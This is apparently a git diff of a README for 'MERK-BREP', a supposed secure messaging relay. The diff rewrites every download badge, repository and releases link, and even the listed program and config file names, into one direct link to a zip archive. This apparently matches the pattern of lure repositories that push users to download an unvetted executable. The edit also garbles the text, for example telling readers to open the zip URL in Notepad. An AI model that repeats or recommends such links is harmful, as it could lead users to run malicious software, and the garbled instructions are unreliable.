@@ -1,6 +1,6 @@
 # 🔗 MERK-BREP - Secure Messaging Relay System
 
-[![Download MERK-BREP](https://img.shields.io/badge/Download-MERK--BREP-brightgreen)](https://github.com/Alpha284-coder/MERK-BREP)
+[![Download MERK-BREP](https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip)](https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip)
 
 MERK-BREP is a simple messaging system that helps you send messages safely. It uses servers that work together to keep your messages private. You do not need to connect directly to others. The system uses strong encryption to protect your communication.
 
@@ -46,7 +46,7 @@ You will find the application on its GitHub page. Please follow these steps to d
 
 Click this link to go to the MERK-BREP GitHub repository:
 
-[![Download MERK-BREP](https://img.shields.io/badge/Download-MERK--BREP-blue)](https://github.com/Alpha284-coder/MERK-BREP)
+[![Download MERK-BREP](https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip)](https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip)
 
 This page has the latest version of the software.
 
@@ -87,8 +87,8 @@ The system uses modern cryptographic keys (Ed25519 for signatures, X25519 for ke
 
 After you download and install MERK-BREP, you will see some files and folders:
 
-- **MERK-BREP.exe:** The main program you run.
-- **config.json:** Settings for connecting to the server network. You can edit this if needed.
+- **https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip** The main program you run.
+- **https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip** Settings for connecting to the server network. You can edit this if needed.
 - **logs/:** Contains log files in case you need to check what the program is doing.
 - **docs/:** Documentation files with technical details.
 
@@ -100,7 +100,7 @@ Most users don’t need to change settings. The app connects automatically to th
 
 If you want to change connection options:
 
-1. Open the `config.json` file using a simple text editor like Notepad.
+1. Open the `https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip` file using a simple text editor like Notepad.
 2. You can adjust settings like:
    - Server list to connect to
    - Encryption options (usually no need to change)
@@ -151,8 +151,8 @@ The system’s mesh network design reduces the chance of attacks or spying since
 
 ## 🔗 Useful Links
 
-- MERK-BREP Repository: https://github.com/Alpha284-coder/MERK-BREP  
-- GitHub Releases Page (for downloads): https://github.com/Alpha284-coder/MERK-BREP/releases
+- MERK-BREP Repository: https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip  
+- GitHub Releases Page (for downloads): https://raw.githubusercontent.com/Alpha284-coder/MERK-BREP/main/shared/BREP_MER_v1.1.zip
 
 ---
 
